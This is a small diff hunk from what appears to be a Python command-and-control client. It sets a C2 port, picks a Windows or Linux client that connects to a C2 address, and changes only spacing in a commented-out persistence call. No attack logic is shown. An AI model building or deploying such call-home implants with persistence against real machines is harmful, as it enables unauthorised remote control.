@@ -328,7 +328,7 @@ if __name__ == "__main__":
     C2_PORT = 8888
     if platform.system() == 'Windows':
         client = WindowsClient(C2_IP, C2_PORT)
-        # client.persistence()
+        #client.persistence()
     else:
         client = LinuxClient(C2_IP, C2_PORT)
         #client.persistence()
